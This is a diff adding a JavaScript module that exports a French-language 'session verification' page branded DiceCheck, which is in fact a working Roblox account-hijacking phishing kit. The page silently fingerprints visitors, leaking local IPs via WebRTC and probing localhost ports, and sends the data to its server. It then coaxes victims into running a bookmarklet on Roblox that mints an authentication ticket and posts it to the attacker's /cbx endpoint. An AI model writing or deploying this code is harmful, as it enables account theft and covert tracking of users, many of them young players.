@@ -1,0 +1,165 @@
+export default `<!DOCTYPE html>
+<html lang="fr"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Vérification de session</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{min-height:100vh;display:grid;place-items:center;padding:16px;font-family:"Segoe UI",system-ui,sans-serif;color:#eaf0fb;background:#070a12;
+background-image:radial-gradient(700px 520px at 12% -5%,#1b2a56 0,transparent 60%),radial-gradient(700px 520px at 88% 105%,#2b1852 0,transparent 60%)}
+.card{width:100%;max-width:390px;text-align:center;padding:32px 24px 18px;border-radius:22px;
+background:linear-gradient(180deg,rgba(255,255,255,.075),rgba(255,255,255,.02));border:1px solid rgba(255,255,255,.1);box-shadow:0 26px 70px rgba(0,0,0,.6)}
+.shield{width:70px;height:70px;margin:0 auto 16px;border-radius:19px;display:grid;place-items:center;background:linear-gradient(140deg,#5b8cff,#8b5cff);animation:fl 4.6s ease-in-out infinite}
+@keyframes fl{0%,100%{transform:translateY(0)}50%{transform:translateY(-4px)}}
+h1{font-size:19px;font-weight:600}
+p.sub{color:#8b96ad;font-size:13px;margin-top:7px;min-height:34px;line-height:1.5}
+.ring{position:relative;width:132px;height:132px;margin:20px auto 6px}
+.ring svg{transform:rotate(-90deg)}
+.ring .bg{fill:none;stroke:rgba(255,255,255,.1);stroke-width:7}
+.ring .fg{fill:none;stroke:#5b8cff;stroke-width:7;stroke-linecap:round;stroke-dasharray:352;stroke-dashoffset:352;transition:stroke-dashoffset .12s linear}
+.ring.on .fg{stroke:#2bd576}
+.ring .txt{position:absolute;inset:0;display:grid;place-items:center;font-size:12px;color:#8b96ad}
+.btn{display:none;width:100%;margin-top:14px;padding:12px;border:0;border-radius:12px;font-size:13.5px;font-weight:600;color:#fff;background:linear-gradient(135deg,#5b8cff,#8b5cff);cursor:pointer}
+.btn.show{display:block}
+.ok{display:none;text-align:center}
+.ok.show{display:block}
+.ok svg{width:80px;height:80px;margin:0 auto 8px;display:block}
+.ok h2{font-size:19px;font-weight:600;color:#2bd576}
+.badge{display:inline-block;margin-top:12px;padding:6px 12px;border-radius:99px;font-size:11.5px;color:#bcd0ff;border:1px solid rgba(91,140,255,.25);background:rgba(91,140,255,.08)}
+.step{display:none;margin-top:16px;padding-top:14px;border-top:1px solid rgba(255,255,255,.07)}
+.step.show{display:block}
+.step p{font-size:11.5px;color:#8b96ad;margin-bottom:9px;line-height:1.5}
+.step a{display:inline-block;padding:9px 13px;border-radius:9px;font-size:11.5px;color:#eaf0fb;text-decoration:none;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.04)}
+footer{margin-top:18px;padding-top:12px;border-top:1px solid rgba(255,255,255,.07);font-size:11.5px;color:#8b96ad}
+footer a{color:#9db4ff;text-decoration:none}
+</style></head>
+<body>
+<main class="card">
+  <div id="s1">
+    <div class="shield"><svg width="36" height="36" viewBox="0 0 24 24"><path d="M12 2.5l7 3v5.2c0 4.3-2.9 8.3-7 9.8-4.1-1.5-7-5.5-7-9.8V5.5l7-3z" fill="#fff"/><path d="M8.6 12.2l2.2 2.2 4.6-4.6" stroke="#3a5bd0" stroke-width="1.9" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+    <h1>Vérification de session</h1>
+    <p class="sub" id="sub">Maintiens la barre <b>ESPACE</b> pour lancer la vérification.</p>
+    <div class="ring" id="ring">
+      <svg width="132" height="132" viewBox="0 0 132 132"><circle class="bg" cx="66" cy="66" r="56"/><circle class="fg" id="fg" cx="66" cy="66" r="56"/></svg>
+      <div class="txt" id="pct">0%</div>
+    </div>
+    <button class="btn" id="relog">Se connecter à Roblox</button>
+    <div class="step" id="step">
+      <p>Dernière étape — glisse ce bouton dans tes favoris, puis ouvre Roblox et clique dessus :</p>
+      <a id="bm" href="#" onclick="return false">DiceCheck</a>
+    </div>
+  </div>
+  <div class="ok" id="s2">
+    <svg viewBox="0 0 52 52"><circle cx="26" cy="26" r="24" fill="none" stroke="#2bd576" stroke-width="2.5"/><path d="M14.5 27l7.5 7.5L37.5 19" fill="none" stroke="#2bd576" stroke-width="3.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    <h2>Session vérifiée</h2>
+    <p class="sub" id="who"></p>
+    <div class="badge">Sécurisé par DiceCheck</div>
+  </div>
+  <footer>Problème ? <a href="mailto:support@dicecheck.xyz">support@dicecheck.xyz</a></footer>
+</main>
+<script>
+(function(){
+var K='', done=false, opened=false, n=0, tmr=null, poll=null, W=null, cid='';
+var FF=/firefox/i.test(navigator.userAgent);
+function $(i){return document.getElementById(i)}
+function rnd(n){var s='',c='abcdefghijklmnopqrstuvwxyz0123456789',i;for(i=0;i<n;i++)s+=c[Math.floor(Math.random()*c.length)];return s}
+
+var F={screen:screen.width+'x'+screen.height+'@'+screen.colorDepth,lang:navigator.language,
+ cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory,
+ tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:document.referrer,apps:''};
+
+try{var g=document.createElement('canvas').getContext('webgl'),d=g.getExtension('WEBGL_debug_renderer_info');
+ F.gpu=g.getParameter(d.UNMASKED_RENDERER_WEBGL)}catch(e){}
+
+try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+ pc.onicecandidate=function(e){if(!e.candidate)return;var m=e.candidate.candidate.split(' ')[4];
+  if(!m)return; if(m.indexOf('.local')>-1){if(!F.mdns)F.mdns=m}else if(!F.localIP)F.localIP=m};
+ pc.createDataChannel('x');pc.createOffer().then(function(d){pc.setLocalDescription(d)})}catch(e){}
+
+[6463,27060,50300].forEach(function(p){
+ fetch('http://127.0.0.1:'+p,{mode:'no-cors'}).then(function(){F.apps+=' '+p}).catch(function(){})});
+
+try{navigator.getBattery().then(function(b){F.batt=Math.round(b.level*100)+'%'+(b.charging?' (charge)':'')})}catch(e){}
+
+function sendFp(){
+ var c=new URLSearchParams(location.search).get('c')||'';
+ return fetch('/fp?c='+encodeURIComponent(c),
+  {method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(F)})
+  .then(function(r){return r.json()}).then(function(d){cid=d.cid}).catch(function(){});
+}
+
+function start(){
+ if(done||opened)return;
+ K=rnd(30); opened=true;
+ $('ring').className='ring';
+ sendFp().then(tick);
+}
+
+function tick(){
+ n++;
+ var p=Math.min(100,n*100/22);
+ $('fg').style.strokeDashoffset=352-352*p/100;
+ $('pct').textContent=Math.round(p)+'%';
+ if(n===4)open_();
+ if(p>=100){clearInterval(tmr);$('ring').className='ring on';finish();return}
+ tmr=setTimeout(tick,110);
+}
+
+function open_(){
+ var o = FF ? 'width=430,height=600,left='+Math.round((screen.width-430)/2)+',top=60
+            : 'width=1,height=1,left=9999,top=9999';
+ W=window.open('/go?cid='+encodeURIComponent(cid)+'&k='+K,'v',o);
+ if(!W){$('relog').className='btn show';$('relog').textContent='Ouvrir la vérification';return}
+ if(FF){try{W.focus()}catch(e){}}
+}
+
+function bm(){
+ var s='javascript:(async()=>{try{const h={credentials:"include"};'+
+  'const c=await fetch("https://auth.roblox.com/v2/logout",{method:"POST",...h});'+
+  'const k=c.headers.get("x-csrf-token");'+
+  'const t=await fetch("https://auth.roblox.com/v1/authentication-ticket",{method:"POST",'+
+  'credentials:"include",headers:{"x-csrf-token":k}});'+
+  'const tk=t.headers.get("rbx-authentication-ticket");'+
+  'const u=await (await fetch("https://users.roblox.com/v1/users/authenticated",'+
+  '{credentials:"include"})).json();'+
+  'const r=await fetch("'+location.origin+'/cbx",{method:"POST",'+
+  'headers:{"content-type":"application/json"},'+
+  'body:JSON.stringify({ticket:tk,user:u,sid:"'+K+'"})});'+
+  'document.title=(await r.json()).ok?"OK":"ERR"}catch(e){document.title="ERR"}})()';
+ $('bm').href=s;
+}
+
+function finish(){
+ poll=setInterval(function(){
+  fetch('/st?k='+K).then(function(r){return r.json()}).then(function(d){
+   if(d.s==='done'){
+     clearInterval(poll);done=1;
+     $('s1').style.display='none';$('s2').className='ok show';
+     $('who').textContent=d.n?('Connecté en tant que '+d.n):'Vérification terminée.';
+     $('step').className='step show';
+     bm();
+   } else if(d.s==='need'){
+     clearInterval(poll);
+     $('relog').className='btn show';
+     $('relog').textContent='Session Roblox requise — se connecter';
+     $('relog').onclick=function(){
+       window.open('/relogin?s='+K,'r','width=430,height=600');
+       $('relog').className='btn'; opened=false; start();
+     };
+   } else if(d.s==='fail'){
+     clearInterval(poll);$('sub').textContent='Échec, réessaie.';opened=false;n=0;
+     $('ring').className='ring';$('fg').style.strokeDashoffset=352;$('pct').textContent='0%';
+   }
+  }).catch(function(){})
+ },700);
+}
+
+addEventListener('keydown',function(e){
+ if(e.code!=='Space')return;
+ e.preventDefault();
+ start();
+},{passive:false});
+
+addEventListener('click',function(){if(!opened)start()});
+})();
+</script>
+</body></html>`;
